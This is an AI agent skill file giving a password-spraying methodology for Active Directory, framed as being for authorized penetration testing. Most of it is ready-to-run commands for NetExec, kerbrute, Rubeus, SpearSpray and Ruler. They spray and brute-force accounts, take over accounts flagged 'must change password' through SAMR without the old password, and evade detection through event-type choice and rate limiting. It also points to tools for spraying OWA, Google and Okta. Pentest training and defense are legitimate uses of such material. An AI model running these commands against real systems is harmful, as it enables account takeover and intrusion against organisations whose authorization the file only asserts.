---
name: ad-password-spraying
description: Active Directory password spraying and brute force methodology for authorized security assessments. Use this skill when conducting penetration tests, red team operations, or security audits on Active Directory environments where you have explicit written authorization. Covers password policy enumeration, spraying techniques with various tools (NetExec, kerbrute, Rubeus, SpearSpray), SAMR password change exploitation, and OWA/Google/Okta spraying. Make sure to use this skill whenever the user mentions password spraying, credential testing, AD brute force, or needs to enumerate valid credentials in an AD environment.
---

# Active Directory Password Spraying Methodology

## Authorization Required

**This skill is for authorized security testing only.** You must have:
- Written authorization from the system owner
- Clear scope defining target systems
- Understanding of legal and ethical boundaries

Unauthorized use of these techniques is illegal and unethical.

## Overview

Password spraying is a technique where you try a small number of common passwords against many users, rather than many passwords against one user. This avoids account lockouts while still potentially finding valid credentials.

**Default AD password policy:**
- Minimum password length: 7 characters
- Account lockout threshold: 10 failed attempts (by default)

## Pre-Engagement Checklist

1. **Confirm authorization** - Written scope and approval
2. **Understand the environment** - Domain structure, user count, password policies
3. **Plan for lockouts** - Know the lockout threshold and duration
4. **Have an exit strategy** - How to handle discovered credentials
5. **Document everything** - For reporting and legal protection

## Password Policy Enumeration

Before spraying, understand the password policy to avoid lockouts.

### From Linux

```bash
# Using crackmapexec
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

# Using enum4linux
enum4linux -u 'username' -p 'password' -P <IP>

# Using rpcclient
rpcclient -U "" -N <IP>
rpcclient $> querydominfo

# Using ldapsearch
ldapsearch -h <IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### From Windows

```powershell
net accounts
(Get-DomainPolicy)."SystemAccess"  # From PowerView
```

## Password Spraying Techniques

### NetExec (Recommended - CME Successor)

NetExec is the modern replacement for crackmapexec with better performance and features.

```bash
# Generate hosts file for Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo tee -a /etc/hosts

# Spray single password against user list
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' --continue-on-success --no-bruteforce --shares

# Validate successful credentials via WinRM
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Sync clock before Kerberos operations
sudo ntpdate <DC_FQDN>
```

### kerbrute (Go version)

```bash
# Password spraying
./kerbrute_linux_amd64 passwordspray -d <domain> [--dc <DC_IP>] users.txt Password123

# Brute force single user
./kerbrute_linux_amd64 bruteuser -d <domain> [--dc <DC_IP>] passwords.lst username
```

### Spray (Greenwolf)

Configurable lockout protection:

```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```

### Rubeus (Windows)

```powershell
# Spray with user and password lists
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain> /outfile:<output>

# Spray all domain users
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output>
```

### Invoke-DomainPasswordSpray (PowerShell)

Automatically discovers users and respects password policy:

```powershell
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```

### rpcclient (Linux)

```bash
for u in $(cat users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority;
done
```

## SAMR Password Change Exploitation

Accounts with "password must change at next logon" can be taken over without knowing the old password.

### Workflow

1. **Enumerate users via RID brute**
```bash
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```

2. **Spray empty password**
```bash
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```

3. **Change password on STATUS_PASSWORD_MUST_CHANGE accounts**
```bash
env NEWPASS='P@ssw0rd!2025#'
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"
```

4. **Validate new credentials**
```bash
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```

**Note:** A `[+]` without `(Pwn3d!)` in some modules means the creds are valid but the account lacks interactive logon rights.

## SpearSpray - Advanced Kerberos Pre-Auth Spraying

SpearSpray uses Kerberos pre-authentication for lower-noise spraying with LDAP targeting and policy awareness. It generates 4768/4771 events instead of 4625, making it harder to detect.

### Basic Usage

```bash
# List available pattern variables
spearspray -l

# Basic run
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (encrypted)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```

### Targeting

```bash
# Custom LDAP filter
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
  -q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Pattern variables
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
  -sep @-_ -suf !? -x ACME
```

### Stealth Controls

```bash
# Concurrency and rate limiting
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
  -t 5 -j 3,5 --max-rps 10

# Lockout threshold buffer (default: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```

### BloodHound Integration

```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
  -nu neo4j -np bloodhound --uri bolt://localhost:7687
```

### Pattern System

Create `patterns.txt` with templates:
```
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```

**Available variables:**
- `{name}`, `{samaccountname}`
- Temporal from pwdLastSet: `{year}`, `{short_year}`, `{month_number}`, `{month_en}`, `{season_en}`
- Helpers: `{separator}`, `{suffix}`, `{extra}`

## Outlook Web Access Spraying

### Ruler

```bash
./ruler-linux64 --domain <domain> -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
```

### Metasploit

- `auxiliary/scanner/http/owa_login`
- `auxiliary/scanner/http/owa_ews_login`

### PowerShell Tools

- DomainPasswordSpray
- MailSniper

## Third-Party Services

### Google Workspace

- CredKing: https://github.com/ustayready/CredKing

### Okta

- CredKing
- Okta-Password-Sprayer: https://github.com/Rhynorater/Okta-Password-Sprayer
- CredMaster: https://github.com/knavesec/CredMaster

## Operational Best Practices

1. **Clock synchronization** - Always sync before Kerberos operations: `sudo ntpdate <dc_fqdn>`
2. **Rate limiting** - Use jitter and max-rps to avoid detection
3. **Lockout awareness** - Know the threshold and leave buffer (use `-thr` in SpearSpray)
4. **Documentation** - Log all attempts and results
5. **Cleanup** - Have a plan for discovered credentials
6. **Query PDC emulator** - Use `-dc` flag to read authoritative badPwdCount

## Common User Lists

- Statistically Likely Usernames: https://github.com/insidetrust/statistically-likely-usernames

## References

- SpearSpray: https://github.com/sikumy/spearspray
- kerbrute: https://github.com/TarlogicSecurity/kerbrute
- Spray: https://github.com/Greenwolf/Spray
- SprayHound: https://github.com/Hackndo/sprayhound
- Ired.team AD Password Spraying: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying
- Black Hills InfoSec: https://www.blackhillsinfosec.com/?p=5296
- Hunter2 Guide: https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying
